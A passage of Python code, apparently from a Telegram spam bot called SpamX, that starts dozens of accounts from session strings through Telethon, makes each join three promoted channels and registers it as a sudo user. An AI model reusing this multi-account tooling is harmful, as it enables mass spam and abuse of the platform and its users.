            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 35 not Found")
        pass
        session_name = "SpamXspam"
        omfo35 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo35.start()
        except Exception as e:
            pass


    if STRING36:
        session_name = str(STRING36)
        print("String 36 Found")
        omfo36 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 36")
            await omfo36.start()
            botme = await omfo36.get_me()
            await omfo36(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo36(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo36(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 36 not Found")
        session_name = "SpamXspam"
        omfo36 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo36.start()
        except Exception as e:
            pass
   
    if STRING37:
        session_name = str(STRING37)
        print("String 37 Found")
        omfo37 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 37")
            await omfo37.start()
            botme = await omfo37.get_me()
            await omfo37(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo37(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo37(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 37 not Found")
        session_name = "SpamXspam"
        omfo37 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo37.start()
        except Exception as e:
            pass
   
    if STRING38:
        session_name = str(STRING38)
        print("String 38 Found")
        omfo38 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 38")
            await omfo38.start()
            botme = await omfo38.get_me()
            await omfo38(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo38(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo38(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 38 not Found")
        session_name = "SpamXspam"
        omfo38 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo38.start()
        except Exception as e:
            pass
   
    if STRING39:
        session_name = str(STRING39)
        print("String 39 Found")
        omfo39 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 39")
            await omfo39.start()
            botme = await omfo39.get_me()
            await omfo39(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo39(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo39(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 39 not Found")
        session_name = "SpamXspam"
        omfo39 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo39.start()
        except Exception as e:
            pass
   
    if STRING40:
        session_name = str(STRING40)
        print("String 40 Found")
        omfo40 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 40")
            await omfo40.start()
            botme = await omfo40.get_me()
            await omfo40(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo40(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo40(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 40 not Found")
        session_name = "SpamXspam"
        omfo40 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo40.start()
        except Exception as e:
            pass

loop = asyncio.get_event_loop()
loop.run_until_complete(SpamX())
